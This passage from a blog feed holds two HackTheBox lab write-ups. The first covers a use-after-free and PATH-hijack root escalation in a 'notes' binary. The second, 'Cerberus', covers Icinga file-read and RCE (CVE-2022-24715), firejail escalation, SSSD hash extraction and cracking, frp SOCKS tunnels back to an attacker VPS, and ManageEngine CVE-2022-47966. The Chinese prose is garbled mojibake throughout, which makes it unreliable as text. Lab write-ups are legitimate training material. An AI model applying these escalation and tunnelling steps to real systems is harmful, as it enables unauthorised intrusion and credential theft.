class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write your note:&quot;</span>);<br>  __isoc99_scanf(&amp;DAT_0010218b,local_18);<br>  <span class="hljs-keyword">break</span>;<br>  <br>  <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: <span class="hljs-comment">// Backup notes</span><br>  <span class="hljs-keyword">if</span> (local_10 == (<span class="hljs-type">void</span> *)<span class="hljs-number">0x0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;First create an user!\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar2 = <span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *)((<span class="hljs-type">long</span>)local_10 + <span class="hljs-number">0x18</span>),<span class="hljs-string">&quot;admin&quot;</span>);<br>    <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access granted!&quot;</span>);<br>      <span class="hljs-comment">// ä½¿ç”¨rootæƒé™æ‰§è¡Œä»¥ä¸‹tarå‘½ä»¤</span><br>      setuid(<span class="hljs-number">0</span>);<br>      setgid(<span class="hljs-number">0</span>);<br>      system(<span class="hljs-string">&quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><ol><li>case3çš„æ—¶å€™ï¼Œå› ä¸ºåˆ é™¤äº†ç”¨æˆ·ï¼Œç¨‹åºä½¿ç”¨<code>free(local_10)</code>é‡Šæ”¾äº†å†…å­˜ï¼Œä½†æŒ‡é’ˆlocal_10æ²¡æœ‰é‡ç½®ï¼Œè¿˜æ˜¯æŒ‡å‘è¿™å—å†…å­˜</li><li>case4çš„æ—¶å€™ï¼Œç¨‹åºé€šè¿‡<code>local_18 = malloc(0x28)</code>åˆå¼€äº†ä¸€å—å†…å­˜æ­¤æ—¶local_18 å’Œlocal_10 æŒ‡å‘åŒä¸€å—å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡case 4å†™ä¸€ä¸ªnoteï¼Œè¦†ç›–local_10çš„å†…å®¹ï¼Œè®©æˆ‘ä»¬çš„roleå˜æˆadmin</li><li>case10çš„æ—¶å€™é€šè¿‡<code>local_10</code>æŒ‡å‘çš„åœ°å€ä¸­çš„å†…å®¹åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºadminï¼Œæ˜¯çš„è¯å°±ä½¿ç”¨rootæƒé™æŒ‡å‘tarå‘½ä»¤</li></ol><h4 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a><strong>åˆ©ç”¨è¿‡ç¨‹</strong></h4><ol><li>case1ï¼Œéšä¾¿åˆ›å»ºä¸€ä¸ªç”¨æˆ·</li><li>case3ï¼Œåˆ é™¤è¯¥ç”¨æˆ·</li><li>case4ï¼Œå‰24å­—èŠ‚éšä¾¿å†™ï¼Œåé¢å†™ä¸Šadminå³å¯</li><li>case8ï¼Œå³å¯é€šè¿‡rootæƒé™æŒ‡å‘tarè¯­å¥</li></ol><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶Roleå·²ç»æ˜¯admin</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fY9YjM5SPN.png" alt=""></p><p>æ‰§è¡Œcase9æˆåŠŸ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BbsoOYSTik.png" alt=""></p><p>ä½†æ‰§è¡Œtaræœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><h4 id="Linuxç¯å¢ƒå˜é‡åŠ«æŒææƒ"><a href="#Linuxç¯å¢ƒå˜é‡åŠ«æŒææƒ" class="headerlink" title="Linuxç¯å¢ƒå˜é‡åŠ«æŒææƒ"></a>Linuxç¯å¢ƒå˜é‡åŠ«æŒææƒ</h4><p><strong>åŸç†</strong></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YxOn6fg6tY.png" alt=""></p><p>Linuxä¼šæ ¹æ®ç¯å¢ƒå˜é‡$PATHå¯»æ‰¾è½¯ä»¶ï¼Œæ¯”å¦‚æˆ‘ä»¬æ‰§è¡Œtarï¼Œä¼šå»æŒ‰ç…§è¿™ä¸ªé¡ºåºå¯»æ‰¾</p><ol><li>/usr/local/bin/tar</li><li>/usr/bin/tar</li><li>/bin/tar</li><li>/usr/local/games/tar</li><li>/usr/games/tar</li><li>æ‰¾ä¸åˆ°äº†</li></ol><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªåˆ¶ä¸€ä¸ªtarï¼Œå¹¶ä¸”ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œå†é€šè¿‡notesçš„è½¯ä»¶æ¼æ´è®©rootæ‰§è¡Œæ¶æ„taræ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zkqoHt-_C0.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ylqTmRQeqn.png" alt=""></p><p>æˆåŠŸ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_QJJFrW6ut-.png" alt=""></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><h4 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h4><ol><li>smbæ³„éœ²é‚®ä»¶å†…å®¹</li><li>è™šæ‹Ÿä¸»æœºçˆ†ç ´</li><li>POSTç›®å½•çˆ†ç ´</li><li>SSRFæ‰“SMTPé’“é±¼</li></ol><h4 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h4><ol><li>ç›‘å¬è¿›ç¨‹ï¼Œå‘½ä»¤æ³„éœ²tbuckley å¯†ç </li><li>GUIDç¨‹åºnotes</li><li>é€†å‘åˆ†ænotes</li><li>Linuxç¯å¢ƒå˜é‡åŠ«æŒ + notesæ¼æ´ææƒ</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cerberus-HackTheBox</title>
    <link href="/2023/07/30/Cerberus-HackTheBox/"/>
    <url>/2023/07/30/Cerberus-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>å¹´è½»äººçš„ç¬¬ä¸€å°Hardé¶æœºï¼ŒçœŸçš„å¤ªéš¾äº†</p><p>å¼€å±€å…ˆæ‰«æï¼Œä¸å¾€å¸¸çš„Windowsé¶æœºä¸åŒï¼Œè¿™å°åªå¼€äº†8080</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Syu0LNRQsy.png" alt=""></p><p>è®¿é—®8080ï¼Œå‘ç°ä¸€ä¸ªç›‘æ§è½¯ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f_k4yYa1Rv.png" alt=""></p><h3 id="Linux-User-Shell"><a href="#Linux-User-Shell" class="headerlink" title="Linux User Shell"></a>Linux User Shell</h3><h4 id="CVE-2022-24715"><a href="#CVE-2022-24715" class="headerlink" title="CVE-2022-24715"></a>CVE-2022-24715</h4><p>ä¸Šexploit-notesçœ‹çœ‹</p><p><a href="https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/">https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/</a></p><p>ç›´æ¥è¯•è¯•RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KGz5DRnkJc.png" alt=""></p><p>æ²¡æ³•ç™»å½•ï¼Œçœ‹æ¥æ˜¯éœ€è¦ç”¨æˆ·å¯†ç çš„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OolDkW3Jij.png" alt=""></p><p>ç•™æ„åˆ°ä¸‹é¢è¿˜æœ‰ä¸ªæœªæˆæƒçš„ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_wpRYVjfCQq.png" alt=""></p><p>ç¡®å®å¯ä»¥ï¼Œé‚£æˆ‘ä»¬å°±æ‰¾ä¸€ä¸‹ç”¨æˆ·å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Md_NJpmM7S.png" alt=""></p><p>åœ¨<code>/etc/icingaweb2/resources.ini</code>ä¸­å‘ç°äº†ç”¨æˆ·å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_83eamjJax0.png" alt=""></p><p>ç™»å½•æˆåŠŸ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fx7dSR2HVB.png" alt=""></p><p>å†è¯•è¯•RCEï¼Œæ‹¿ä¸‹ã€‚åªæ˜¯www-dataè´¦æˆ·ï¼Œè¿˜éœ€ææƒ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_XMobJQyJEi.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pxzRR1dFhs.png" alt=""></p><p>linpeasè·‘ä¸€ä¸‹ï¼Œç•™æ„åˆ°rootè¿è¡Œäº†redisï¼Œä½†æ˜¯è¿™é‡Œè¿SSHéƒ½æ²¡å¼€ï¼Œå†™rootå…¬é’¥æ˜¯æ²¡åŠæ³•äº†ã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SEnr6S3KOl.png" alt=""></p><p>ç«Ÿç„¶è¿˜æœ‰53ç«¯å£</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2emTnkBNR0.png" alt=""></p><p>ä¸€äº›smbä¿¡æ¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_11mGRaAaWj.png" alt=""></p><h3 id="Linux-Root-Shell"><a href="#Linux-Root-Shell" class="headerlink" title="Linux Root Shell"></a>Linux Root Shell</h3><h4 id="firejailææƒ"><a href="#firejailææƒ" class="headerlink" title="firejailææƒ"></a>firejailææƒ</h4><p>SUIDè¿™é‡Œå‘ç°äº†æ–°é¢å­”</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_w4WMbtmdfp.png" alt=""></p><p>è¿™é‡Œæ²¡æœ‰</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BjDcUGB7iE.png" alt=""></p><p>ä¸è¿‡åœ¨sploitus.comæ‰¾åˆ°äº†ææƒæ¼æ´</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Fd2wc36Ezz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PwX2_gtlkN.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_K4Pwy3bNow.png" alt=""></p><p>ç„¶é¹…å¹¶æ²¡æœ‰å‘ç°ä»»ä½•flagï¼Œè¿™å°é¶æœºæ˜¯Windowsé¶æœºï¼Œè¿™æ³¢æ‹¿ä¸‹ä¸€ä¸ªLinuxæœºå™¨ã€‚ä¼°è®¡è¦å¼€å§‹æ¨ªå‘æ‰è¡Œ</p><h2 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h2><p>å›æƒ³ä¸€ä¸‹è¿™æ˜¯ä¸€å°Windowsé¶æœºï¼Œä½†ç»™äº†æˆ‘ä»¬ä¸€å°Linuxæ‰“ï¼Œè€Œä¸”å¼€äº†DNSå’ŒsmbæœåŠ¡ã€‚æˆ‘çŒœæµ‹æ˜¯ç”¨Linuxæ­çš„åŸŸï¼Œä¸Šç½‘äº†è§£ä¸€ä¸‹ã€‚</p><p>å†è·‘ä¸€æ¬¡linpeasæ”¶é›†ä¿¡æ¯ï¼Œè¿™é‡Œå¯çœ‹åˆ°SSSDï¼Œå®ƒå¯ä»¥è®©LinuxæœåŠ¡å™¨åŠ åˆ°åŸŸå†…</p><p><a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel">https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jebiFaJej9.png" alt=""></p><p>LDAPä¿¡æ¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_41jFqwGPif.png" alt=""></p><p>ç¡®å®å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªLinuxæ­å»ºçš„åŸŸ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H6FgGol75e.png" alt=""></p><p>è¿™è¾¹è¿˜æœ‰ä¸€äº›ç¥¨æ®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_rs4OndHPRb.png" alt=""></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">You could use SSSDKCMExtractor to extract the tickets stored here<br><span class="hljs-literal">-rw-------</span> <span class="hljs-number">1</span> root root <span class="hljs-number">1638400</span> Mar  <span class="hljs-number">1</span> <span class="hljs-number">12</span>:<span class="hljs-number">11</span> /var/lib/sss/secrets/secrets.ldb<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMnhOrmsHD.png" alt=""></p><p>è¿˜æœ‰powershellå†å²å‘½ä»¤</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Nt_QfGuubS.png" alt=""></p><p>æ¶å¿ƒäººã€‚ã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_quwJv3ZVwv.png" alt=""></p><p>ç ”ç©¶ä¸€ä¸‹krb5.keytabæ€ä¹ˆåˆ©ç”¨</p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab</a></p><p>æˆåŠŸè·å¾—Hash</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kO9D1Z9Msq.png" alt=""></p><p>ä½†æˆ‘ä»¬è¿˜æ²¡åšä¸»æœºæ¢æµ‹ï¼Œè¿™é‡Œç”¨ä¸€ä¸‹è‘—åçš„fscan</p><p>å‘ç°è¿˜æœ‰ä¸€å°ä¸»æœºå­˜æ´»</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hHBeqZqP7l.png" alt=""></p><p>æ²¡å¼€445ï¼Œæ— æ³•é€šè¿‡å“ˆå¸Œä¼ é€’æ¨ªå‘è¿‡å»</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jc6CvAEHdR.png" alt=""></p><p>è¿™ä¸ª5985ç«¯å£æ­£æ˜¯winrmçš„ç«¯å£ï¼Œç®—æ˜¯ç»™æˆ‘ä»¬å¼€äº†ä¸ªå£å­ã€‚æœ‰ç”¨æˆ·å¯†ç å³å¯ç™»å½•äº†</p><p>åªèƒ½å†å›åˆ°å‰é¢æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œäº†è§£ä¸€ä¸‹SSSD</p><blockquote><p>SSSD (System Security Services Daemon) æ˜¯ä¸€ä¸ªç”¨äºæä¾›ç»Ÿä¸€èº«ä»½è®¤è¯å’ŒæˆæƒæœåŠ¡çš„å®ˆæŠ¤è¿›ç¨‹ã€‚å®ƒåœ¨Linuxç³»ç»Ÿä¸­å¹¿æ³›ä½¿ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œç”¨äºé›†æˆç”¨æˆ·èº«ä»½éªŒè¯ã€æˆæƒå’Œç”¨æˆ·ä¿¡æ¯æ£€ç´¢ã€‚</p></blockquote><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#ccache-ticket-reuse-from-sssd-kcm">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#ccache-ticket-reuse-from-sssd-kcm</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_58699Nf-de.png" alt=""></p><p>éå¸¸å¯æƒœè¿™å°æœºå­æ²¡æœ‰.secrets.mkey</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d0qtdnaNnG.png" alt=""></p><p>è¿™æ—¶å€™æ­»å»çš„CTFæŠ€å·§åˆæ¥äº†ï¼Œé€šè¿‡stringså‘½ä»¤æŸ¥çœ‹cache_cerberus.local.ldbå¯ä»¥çœ‹åˆ°ä¸€ä¸ªhash</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JDG3nxfrGa.png" alt=""></p><p>johnçˆ†ä¸€ä¸‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Dib8Y2WDvz.png" alt=""></p><p>ç”¨æˆ·æ–¹é¢å¯ä»¥å‘ç°ï¼Œè¿˜æ˜¯è¿™ä¸ªmatthew</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_WDPbnR5J43.png" alt=""></p><h3 id="frp-å†…ç½‘ç©¿é€"><a href="#frp-å†…ç½‘ç©¿é€" class="headerlink" title="frp å†…ç½‘ç©¿é€"></a>frp å†…ç½‘ç©¿é€</h3><h4 id="æœåŠ¡ç«¯ï¼ˆVPSï¼‰"><a href="#æœåŠ¡ç«¯ï¼ˆVPSï¼‰" class="headerlink" title="æœåŠ¡ç«¯ï¼ˆVPSï¼‰"></a>æœåŠ¡ç«¯ï¼ˆVPSï¼‰</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frps.ini <br>[<span class="hljs-type">common</span>]<br>bind_addr = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>bind_port = <span class="hljs-number">7000</span><br><br>./frps <span class="hljs-literal">-c</span> frps.ini<br></code></pre></td></tr></table></figure><h4 id="å®¢æˆ·ç«¯ï¼ˆé¶æœºLinuxï¼‰"><a href="#å®¢æˆ·ç«¯ï¼ˆé¶æœºLinuxï¼‰" class="headerlink" title="å®¢æˆ·ç«¯ï¼ˆé¶æœºLinuxï¼‰"></a>å®¢æˆ·ç«¯ï¼ˆé¶æœºLinuxï¼‰</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frpc.ini<br>[<span class="hljs-type">common</span>]<br>server_addr = <span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span><br>server_port = <span class="hljs-number">7000</span><br><br>[<span class="hljs-type">socks5</span>]<br>remote_port = <span class="hljs-number">1080</span><br>plugin = socks5<br><br><br>./frpc <span class="hljs-literal">-c</span> frpc.ini<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹proxychainsé…ç½®æ–‡ä»¶</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tail <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> /etc/proxychains.conf  //åœ¨æœ€åä¸€è¡Œæ·»åŠ ä»¥ä¸‹é…ç½®<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶VPSä¸Šé€šè¿‡proxychainså·²ç»èƒ½è®¿é—®äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains &lt;<span class="hljs-built_in">command</span>&gt;<br></code></pre></td></tr></table></figure><p>è·å¾—user flagï¼ŒçœŸä¸å®¹æ˜“</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__6aBuASjoN.png" alt=""></p><p>ç›´æ¥ä¸ŠBloodHoundæ”¶é›†ä¸€æ³¢ä¿¡æ¯ï¼Œå¯„äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_awtUwypoFC.png" alt=""></p><p>PowerSploitä¹Ÿå¯„äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_c83qNWjnAJ.png" alt=""></p><p>è¯•ä¸€ä¸‹winpeasï¼Œä¸è´Ÿä¼—æœ›</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_51YR4zGnQE.png" alt=""></p><p>è¯•ä¸€ä¸‹ä¸Šé¢è¿™ä¸ªæ¼æ´ï¼Œå¤±è´¥äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fA-q-CAU26.png" alt=""></p><p>åé¢ç¿»äº†å¾ˆä¹…winpeasï¼Œå‘ç°äº†è¿™ä¸ªADçš„å¯†ç é‡ç½®å·¥å…·</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f0nx4OAibi.png" alt=""></p><p>ç‰ˆæœ¬6.2</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_32rl8S_gOj.png" alt=""></p><p>å­˜åœ¨RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cK8WGvsQYS.png" alt=""></p><p>ç«Ÿç„¶éœ€è¦administratorçš„å¯†ç ..</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JHFhchrUn8.png" alt=""></p><p>æœä¸€ä¸‹å…¶ä»–ä¸ManageEngine ADSelfServiceç›¸å…³çš„CVE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xeIFDj9y5F.png" alt=""></p><p>CVE-2021-40539ç‰ˆæœ¬ä¸åˆé€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_u6c7CGZi9K.png" alt=""></p><p>CVE-2022-47966èƒ½ä»¥NT AUTHORITY\SYSTEM çš„èº«ä»½è¿œç¨‹æ‰§è¡Œä»£ç ï¼Œè¿™å°±å®Œç¾äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2ho3MSDpmt.png" alt=""></p><p>ä½†è¿™ä¸¤ä¸ªå‚æ•°ä¸çŸ¥é“å»å“ªé‡Œæ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ijg_LuKW4F.png" alt=""></p><p>Githubä¸Šçœ‹åˆ°ï¼Œè¿™ä¸ªGUIDåœ¨ç½‘é¡µä¸Šåº”è¯¥èƒ½æåˆ°</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5NplAKSJ8d.png" alt=""></p><p>Issuerå¯èƒ½æ˜¯adfs/services/trust</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iqg9ADUdHa.png" alt=""></p><p>ç«¯å£å¤ªå¤šäº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q-f6fywsFy.png" alt=""></p><p>è¿™é‡Œæ‰¾åˆ°äº†å¯¹åº”ç«¯å£</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_z-XUjYSODu.png" alt=""></p><p>éš¾é“åªèƒ½æœ¬åœ°è®¿é—®ï¼Ÿ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7bfhhJnb5m.png" alt=""></p><h2 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h2><h3 id="frpå†…ç½‘ç©¿é€"><a href="#frpå†…ç½‘ç©¿é€" class="headerlink" title="frpå†…ç½‘ç©¿é€"></a>frpå†…ç½‘ç©¿é€</h3><h4 id="å®¢æˆ·ç«¯ï¼ˆé¶æœºWindowsï¼‰"><a href="#å®¢æˆ·ç«¯ï¼ˆé¶æœºWindowsï¼‰" class="headerlink" title="å®¢æˆ·ç«¯ï¼ˆé¶æœºWindowsï¼‰"></a>å®¢æˆ·ç«¯ï¼ˆé¶æœºWindowsï¼‰</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frpc.ini<br>[<span class="hljs-type">common</span>]<br>server_addr = <span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span><br>server_port = <span class="hljs-number">7000</span><br><br>[<span class="hljs-type">ssh</span>]<br><span class="hljs-built_in">type</span> = tcp<br>local_ip = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>local_port = <span class="hljs-number">9251</span><br>remote_port = <span class="hljs-number">6000</span><br>plugin = socks5<br><br>.\frpc.exe <span class="hljs-literal">-c</span> frpc.ini<br></code></pre></td></tr></table></figure><h4 id="æœåŠ¡ç«¯ï¼ˆVPSï¼‰-1"><a href="#æœåŠ¡ç«¯ï¼ˆVPSï¼‰-1" class="headerlink" title="æœåŠ¡ç«¯ï¼ˆVPSï¼‰"></a>æœåŠ¡ç«¯ï¼ˆVPSï¼‰</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frps.ini <br>[<span class="hljs-type">common</span>]<br>bind_addr = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>bind_port = <span class="hljs-number">7000</span><br><br>./frps <span class="hljs-literal">-c</span> frps.ini<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹proxychainsé…ç½®æ–‡ä»¶</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tail <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> /etc/proxychains.conf  //åœ¨æœ€åä¸€è¡Œæ·»åŠ ä»¥ä¸‹é…ç½®<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">6000</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶VPSä¸Šé€šè¿‡proxychainså·²ç»èƒ½è®¿é—®äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HEO07lAERO.png" alt=""></p><h4 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h4><p>æœ¬åœ°é€šè¿‡Proxifierè¿›è¡Œä»£ç†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qVG5Iv1HDD.png" alt=""></p><p>å³å¯è¿›è¡Œè®¿é—®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9x8VPhkOih.png" alt=""></p><p>ä½¿ç”¨matthew\@CERBERUS.LOCALå’Œå®ƒçš„å¯†ç ç™»å½•ä¸€ä¸‹</p><p>åäº†ä½†æ˜¯è·å¾—äº†æˆ‘ä»¬æƒ³è¦çš„GUID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_giBONGd2_-.png" alt=""></p><h3 id="CVE-2022-47966ææƒ"><a href="#CVE-2022-47966ææƒ" class="headerlink" title="CVE-2022-47966ææƒ"></a>CVE-2022-47966ææƒ</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xogCyqmnjL.png" alt=""></p><p>è®¾ç½®å¥½å‚æ•°ä¹‹åexploitï¼ˆè¿™é‡Œå¤±è´¥äº†å¾ˆå¤šæ¬¡ï¼‰</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_O53SLtqeFO.png" alt=""></p><p>è¿™å›ä¸æ˜¯Script Kiddieäº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H7V9pyB0aV.png" alt=""></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>å¤ªéš¾äº†ï¼Œæ¯æ¬¡æ‰“Windowsé¶æœºéƒ½æ„Ÿè§‰çŸ¥è¯†é‡æš´å¢ã€‚ç»å¸¸éƒ½è¦å»ç 